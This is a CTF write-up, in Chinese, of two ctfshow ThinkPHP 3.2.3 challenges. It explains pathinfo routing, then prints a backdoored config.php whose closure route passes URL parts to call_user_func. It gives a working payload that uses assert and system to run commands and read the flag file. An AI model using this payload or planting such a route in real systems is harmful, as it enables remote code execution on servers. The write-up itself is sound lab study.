## web569（php3.2.3-pathinfo）
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1638716246273-6e9090c4-283f-40b2-a2c3-7c88aa09807d.png)
pathinfo的思想类似于flask框架，可以说是虚拟路由，在被群主一顿教育之后可算是明白了个大概555
比如在flask中，前端给个虚拟路由，后端就会根据这个路由去执行对应的方法；pathinfo的原理也类似，目的是用来弥补php的路由缺点，普通的路由访问是按照文件所在文件夹的位置而直接访问，而在pathinfo模式下，传入url的路径并不是真实存在的，比如这个题，传入/Admin/Login/ctfshowLogin并不是说真的有这个文件路径，而是作为虚拟路由去执行模块/控制/方法，下面引用一下四种路径访问模式

> 在config目录下边来做修改 URL_MODEL的值，分别表述如下：
> 1、值为0   叫做普通模式。如：http://localhost/index.php?m=模块&a=方法
> 2、值为1   叫做pathinfo模式。如：http://localhost/index.php/模块/方法
> 3、值为2   叫做rewrite重写（伪静态） 可以自己写相关的rewrite规则，也可以使用系统为我们提供的rewrite规则隐藏掉index.php，生成：http://localhost/模块/方法
> 4、值为3   叫做兼容模式。当服务器上面不支持pathinfo模式的时候，但是你又在之前的路径访问格式上面，全部用的是pathinfo格式。那么它会提示你路径格式不正确。那么，你就可以用标号为3的兼容模式来处理。他的路径访问类似于http://localhost/index.php?s=模块/方法

综上，payload：/index.php/Admin/Login/ctfshowLogin
## web570（php3.2.3-闭包路由）
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1638718030726-b6554051-ddf1-493f-ace3-2ad85d16174e.png)
下载源文件，翻了半天最终在\Application\Common\Conf\config.php找到了后门
```php
<?php
return array(
	//'配置项'=>'配置值'
	'DB_TYPE'               =>  'mysql',     // 数据库类型
    'DB_HOST'               =>  '127.0.0.1', // 服务器地址
    'DB_NAME'               =>  'ctfshow',          // 数据库名
    'DB_USER'               =>  'root',      // 用户名
    'DB_PWD'                =>  'ctfshow',          // 密码
    'DB_PORT'               =>  '3306',        // 端口
    'URL_ROUTER_ON'   => true, 
	'URL_ROUTE_RULES' => array(
    'ctfshow/:f/:a' =>function($f,$a){
    	call_user_func($f, $a);
    	}
    )
);
```
重点在12行，闭包定义的参数传递在有规则路由和正则路由两种，这里的就是规则路由，访问形式就如/ctfshow/xxx/xxx这种，然后看调用函数，和前面php特性的题差不太多，payload：
GET：/index.php/ctfshow/assert/assert($_POST[a])
POST：a=system('tac /flag_is_here');
